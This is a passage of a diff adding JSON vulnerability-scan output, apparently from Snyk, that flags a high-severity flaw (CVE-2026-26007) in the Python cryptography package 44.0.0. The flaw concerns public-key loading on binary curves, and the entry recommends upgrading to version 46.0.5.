+      "description": "## Overview\n\nAffected versions of this package are vulnerable to Insufficient Verification of Data Authenticity in public key functions `public_key_from_numbers`, `EllipticCurvePublicNumbers.public_key`, `load_der_public_key`, and `load_pem_public_key`, which may reveal bits from a private key when provided with a malicious public key as input. When the application is using `sect*` binary curves for verification - which is a rare use case - these functions do not verify that the provided point belongs to the expected prime-order subgroup of the curve. An attacker can thus expose partial private keys or forge signatures.\n## Remediation\nUpgrade `cryptography` to version 46.0.5 or higher.\n## References\n- [GitHub Commit](https://github.com/pyca/cryptography/commit/0eebb9dbb6343d9bc1d91e5a2482ed4e054a6d8c)\n- [GitHub Release](https://github.com/pyca/cryptography/releases/tag/46.0.5)\n",
+      "disclosureTime": "2026-02-10T21:27:06.000000Z",
+      "epssDetails": {
+        "modelVersion": "v2026.06.15",
+        "percentile": "0.25978",
+        "probability": "0.00341"
+      },
+      "exploit": "Unreported",
+      "exploitDetails": {
+        "maturityLevels": [
+          {
+            "format": "CVSSv3",
+            "level": "Unproven",
+            "type": "secondary"
+          },
+          {
+            "format": "CVSSv4",
+            "level": "Unreported",
+            "type": "primary"
+          }
+        ],
+        "sources": []
+      },
+      "fixedIn": [
+        "46.0.5"
+      ],
+      "from": [
+        "sbom@0.0.0",
+        "cryptography@44.0.0"
+      ],
+      "functions": [],
+      "id": "SNYK-PYTHON-CRYPTOGRAPHY-15263096",
+      "identifiers": {
+        "CVE": [
+          "CVE-2026-26007"
+        ],
+        "CWE": [
+          "CWE-345"
+        ],
+        "GHSA": [
+          "GHSA-r6ph-v2qm-q3c2"
+        ]
+      },
+      "isDisputed": false,
+      "isPatchable": false,
+      "isUpgradable": true,
+      "language": "python",
+      "malicious": false,
+      "modificationTime": "2026-07-01T02:01:20.000000Z",
+      "name": "cryptography",
+      "packageManager": "pip",
+      "packageName": "cryptography",
+      "patches": [],
+      "proprietary": false,
+      "publicationTime": "2026-02-11T08:24:18.000000Z",
+      "reachability": "not-applicable",
+      "references": [
+        {
+          "title": "GitHub Commit",
+          "url": "https://github.com/pyca/cryptography/commit/0eebb9dbb6343d9bc1d91e5a2482ed4e054a6d8c"
+        },
+        {
+          "title": "GitHub Release",
+          "url": "https://github.com/pyca/cryptography/releases/tag/46.0.5"
+        }
+      ],
+      "semver": {
+        "vulnerable": [
+          "[,46.0.5)"
+        ]
+      },
+      "severity": "high",
+      "severityBasedOn": "CVSS",
+      "severityWithCritical": "high",
+      "socialTrendAlert": false,
+      "title": "Insufficient Verification of Data Authenticity",
+      "upgradePath": [
+        false,
+        "cryptography@46.0.5"
+      ],
+      "version": "44.0.0"
+    }
+  ]
+}
